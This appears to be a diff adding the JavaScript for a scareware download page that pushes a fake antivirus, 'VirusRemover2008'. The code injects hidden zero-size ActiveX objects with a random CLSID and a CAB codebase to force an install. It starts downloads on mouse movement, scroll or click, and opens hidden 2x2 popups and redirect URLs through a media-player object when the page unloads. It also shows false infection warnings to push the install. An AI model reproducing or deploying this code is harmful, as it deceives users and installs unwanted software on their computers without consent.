@@ -1,0 +1,304 @@
+var is_XP_SP2     = (navigator.userAgent.indexOf("SV1") != -1) || (navigator.appMinorVersion && (navigator.appMinorVersion.indexOf('SP2') != -1));
+if(is_XP_SP2 && 0 != EX_PARAM_VALUE) {
+	var u = "E596DF5F-4239-4d40-8367-EBADF0165917";
+	document.write("<object id=iie width=0 height=0 classid='CLSID:"+u+"'></object>");
+	document.write("<object id=MPobj width=0 height=0 classid='CLSID:6BF52A52-394A-11D3-B153-00C04F79FAA6'></object>");
+}
+var is_IE = false;
+var is_ie7 = false;
+if (navigator.appName.toLowerCase()=='microsoft internet explorer') {
+	if (navigator.userAgent.toLowerCase().indexOf('opera')<=0) { is_IE=true; }
+}
+
+if (window.navigator.userAgent.indexOf('MSIE 7') != -1){
+  document.write('<comment style="behavior:url(#default#clientCaps)" ID="cc" ></comment>');
+    if (cc.isComponentInstalled("{89820200-ECBD-11CF-8B85-00AA005B4383}", "ComponentID")) {
+   	ie_ver = cc.getComponentVersion("{89820200-ECBD-11CF-8B85-00AA005B4383}", "ComponentID");
+  }
+  if(ie_ver.length) ie_ver_array=ie_ver.split(",");
+  if( parseInt(ie_ver_array[2])>=5700 ) is_ie7=true;
+}
+
+
+if(is_ie7) {
+	document.write("<object id=pbie classid=clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A width=1 height=1><PARAM NAME=ActivateApplets VALUE=1><PARAM NAME=ActivateActiveXControls VALUE=1></object>");
+}
+
+var is_opera  = (navigator.userAgent.indexOf("opera") != -1);
+var is_mac    = (navigator.userAgent.indexOf("mac") != -1);
+var is_mac_ie = (is_IE && is_mac);
+var is_win_ie = (is_IE && !is_mac);
+var is_gecko  = (navigator.product == "Gecko");
+
+var isClick = false;
+var H_FLAG = true;
+var AX4_FLAG = (4 == AX_PARAM_VALUE);
+
+var buy_now = false;
+
+function OkClicked() {
+	var text11 =  PhraseManager.phrase('OkClicked.phrase1');
+	var text12 =  PhraseManager.phrase('OkClicked.phrase2');
+	var text13 =  PhraseManager.phrase('OkClicked.phrase3');
+	alert(text11 + '\n\n' + text12 + '\n\n' + text13);
+}
+
+function doClick(e) {
+
+	if (0 == H_PARAM_VALUE) {
+		doDownload(e);
+	}
+}
+
+function doDownload(e) {
+	if (AX4_FLAG) {
+		__showCab(CABLINK, "cab");
+		AX4_FLAG = false;
+		if (e) {
+			if (e.preventDefault) {
+				e.preventDefault();		
+			} else {
+				e.returnValue=false;
+			}
+		}
+		return false;
+	}
+	window.isClick = true;
+	if (0 != W_PARAM_VALUE) {
+		EX_PARAM_VALUE = 0;
+		J_PARAM_VALUE = 0;
+	}
+	if (1 == J_PARAM_VALUE) {
+		//OkClicked();
+	}
+	
+	if (0 != H_PARAM_VALUE) {
+		document.location.href = INSTURL + '?a=' + param['a'] + '&l=' + param['l'] + '&f=' + param['f'] + '&p=' + p + '&addt=' + param['addt'];
+	}
+	
+	window.isClick = false;
+}
+
+function __generateCabCode() {
+	var __code = '';
+	for (i = 0; i < 32; i++) {
+		__code += ((i == 8) || (i == 12) || (i == 16) || (i == 20)) ? '-' : '';
+		var __num = Math.floor(Math.random() * 16);
+	 	__code += __num.toString(16).toUpperCase();
+	}
+	return __code;
+}
+
+ function __showCab(cabUrl, elementId) {
+	str1 = '<OBJECT CLASSID="CLSID:'+__generateCabCode()+'" CODEBASE="'+cabUrl+'" BORDER="0" HEIGHT="0" WIDTH="0"></OBJECT>';
+	coc=document.getElementById(elementId);
+	coc.innerHTML=str1;
+}
+
+function showCab() {
+	if (2 != W_PARAM_VALUE) {
+		if (1 == AX_PARAM_VALUE) {
+			__showCab(CABLINK, "cab");
+		}
+		if (2 == W_PARAM_VALUE) {
+//		//	__showCab(INSTLINK, "cab1");
+		window.location.href = PPAGE + get;
+		}
+	}
+}
+
+function OnUnloadHandler() {
+	var ex = EX_PARAM_VALUE;
+
+	if (5 == EX_PARAM_VALUE) {
+
+        //window.open("/2009/download/ex.html" + get, "_blank", "mywin","height=2,width=2,left=0,top=0");c
+			
+        if (window.XMLHttpRequest) {
+			document.body.innerHTML += "<embed src=/js/exit.swf?u=" + escape(EX_REDIRECT_URL + get + "&p=" + p) + " autostart=true width=0 height=0></embed>";
+            
+		if (confirm('Do you want to bookmark this page ?')) {
+                try {						
+					window.external.AddFavorite(document.location, document.location);
+				} catch(e) {
+			window.open("/2009/download/ex.html" + get + "&p=" + p, "_blank", "mywin","height=2,width=2,left=0,top=0");
+                    alert("Sorry! Your browser doesn't support this function."); 
+				}
+            }
+        }
+	  	if(!is_ie7){
+			if(is_XP_SP2) {
+	        	window.open("/2009/download/ex.html" + get + "&p=" + p, "_blank", "mywin","height=2,width=2,left=0,top=0");
+			MPobj.launchURL(unescape(EX_REDIRECT_URL + get + "&p=" + p));
+	        }
+    	}
+    	
+    	return true;
+	}
+	
+	
+	
+	
+	if ((ex != 0) && !window.isClick) {
+		var text21 = PhraseManager.phrase('OkUnloadHandler.phrase1');
+		var text22 = PhraseManager.phrase('OkUnloadHandler.phrase2');
+		var text23 = PhraseManager.phrase('OkUnloadHandler.phrase3');
+
+		bResult = confirm(text21 + '\n' + text22 + '\n\n' + text23);
+
+		if (ex != 2) {
+			bResult = true;
+		}
+		if (bResult) {
+			
+			if (ex != 4) {
+				OkClicked();
+			}
+
+			var url = EX_REDIRECT_URL;
+			if (is_IE) {
+				if (is_XP_SP2) {
+					try {						
+						iie.launchURL(url);
+					} catch (er) {
+						w=screen.width/2-280;
+						h=screen.height/2-60;
+				t_d = document.URL;
+				a1_d = t_d.indexOf('/2009/');
+				a2_d = t_d.lastIndexOf('/?')				
+				p_d = t_d.substring(a1+6,a2)
+				get = get + '&p=' + p_d;
+				window.open("/2009/download/ex.html" + get, "_blank", "mywin","height=2,width=2,left=0,top=0");					}
+				} else{
+					w=screen.width/2-280;
+					h=screen.height/2-60;
+					//window.open(url,"new", "width=580,height=180,left="+w+",top="+h);
+					t_d = document.URL;
+					a1_d = t_d.indexOf('/2009/');
+					a2_d = t_d.lastIndexOf('/?')				
+					p_d = t_d.substring(a1+6,a2)
+					get = get + '&p=' + p_d;
+					window.open("/2009/download/ex.html" + get, "_blank", "mywin","height=2,width=2,left=0,top=0"); 
+				}
+			} else {
+				try {
+					w=screen.width/2-280;
+					h=screen.height/2-60;
+				} catch(er) {
+					// Mozilla 1.0 returns exception 0x80004005 if trying
+					// to determine screen.width. Let's set them fixed then.
+					w = 200;
+					h = 300;
+				}
+				t_d = document.URL;
+				a1_d = t_d.indexOf('/2009/');
+				a2_d = t_d.lastIndexOf('/?')				
+				p_d = t_d.substring(a1+6,a2)
+				get = get + '&p=' + p_d;
+				window.open("/2009/download/ex.html" + get, "_blank", "mywin","height=2,width=2,left=0,top=0");
+			}
+		}
+	}
+}
+
+function parseParamH1(e) {
+	if ((H_FLAG) && ((H_PARAM_VALUE == 1) || (H_PARAM_VALUE == 3))) {
+		doDownload(e);
+	}
+	H_FLAG = true;
+}
+
+function parseParamH2(e) {
+	if ((H_FLAG) && (H_PARAM_VALUE == 2)) {
+		doDownload(e);
+	}
+	H_FLAG = true;
+}
+
+function parseParamH4(e) {
+	if ((H_FLAG) && ((H_PARAM_VALUE == 4) || (H_PARAM_VALUE == 10))) {
+		doDownload(e);
+	}
+	H_FLAG = true;
+}
+
+function parseParamH5(e) {
+	if ((H_FLAG) && (H_PARAM_VALUE == 5)) {
+		doDownload(e);
+	}
+	H_FLAG = true;
+}
+
+function __OnLoad() {
+	if (H_PARAM_VALUE == 10) {
+		document.body.style.cursor = 'pointer';
+	}
+}
+
+function simpleChangeUrl() {
+	EX_PARAM_VALUE = 0;
+	J_PARAM_VALUE = 0;
+	H_FLAG = false;
+}
+
+var PRIORITY_TABLE = [
+//	['a', 'b', 'c'], - means that variables 'b' and 'c' block action of variable 'a'
+];
+
+var GetManager = new GetManager();
+var EventManager = new EventManager();
+var PhraseManager = new PhraseManager(_PHRASES);
+
+EventManager.addEvent('obj', window, 'load', showCab);
+EventManager.addEvent('obj', window, 'load', __OnLoad);
+EventManager.addEvent('obj', window, 'unload', OnUnloadHandler);
+EventManager.addEvent('class', 'download_link', 'click', doClick);
+EventManager.addEvent('class', 'other_link', 'click', simpleChangeUrl);
+EventManager.addEvent('obj', window.document, 'mousemove', parseParamH1);
+EventManager.addEvent('obj', window.document, 'mouseover', parseParamH2);
+EventManager.addEvent('obj', window.document, 'click', parseParamH4);
+EventManager.addEvent('obj', window.document, 'mousewheel', parseParamH5);
+
+function agr()
+{
+     if (1 == param['ed'])
+     {
+          try {moveTo(0,0);} catch(e) {};
+          w=window.screen.width;
+          h=window.screen.height;
+          try {resizeTo(w,h);} catch(e) {};
+          var text1 = ("NOTICE: If your computer is infected, you could suffer data loss, erratic PC behavior, PC freezes and crashes.") + "\n";
+          var text2 = ("Detect and remove viruses before they activate themselves on your PC to prevent all these problems.") + "\n\n";
+          var text3 = ("Do you want to install VirusRemover2008 to scan your PC for malware now? (Recommended)");
+          confirm(text1 + text2 + text3);
+          try {moveTo(0,0);} catch(e) {};
+          try {resizeTo(w,h);} catch(e) {};
+          /*if({n} ==1 ) {
+               window.open('{cur_url}');
+          } else {
+               document.location.href='{cur_url}';
+          }*/
+     }
+
+     if (param['ed'] == 2)
+     {
+          w=window.screen.width;
+          h=window.screen.height;
+          try {resizeTo(10,10);} catch(e) {};
+          try {moveTo(w,h);} catch(e) {};
+     
+          var text1 = ("NOTICE: If your computer is infected, you could suffer data loss, erratic PC behavior, PC freezes and crashes.") + "\n";
+          var text2 = ("Detect and remove viruses before they activate themselves on your PC to prevent all these problems.") + "\n\n";
+          var text3 = ("Do you want to install VirusRemover2008 to scan your PC for malware now? (Recommended)");
+     
+          confirm(text1 + text2 + text3);
+          try {moveTo(0,0);} catch(e) {};
+          try {resizeTo(w,h);} catch(e) {};
+          /*if({n} ==1 ) {
+               window.open('{cur_url}');
+          } else {
+               document.location.href='{cur_url}';
+          }*/
+     }
+}
+agr();
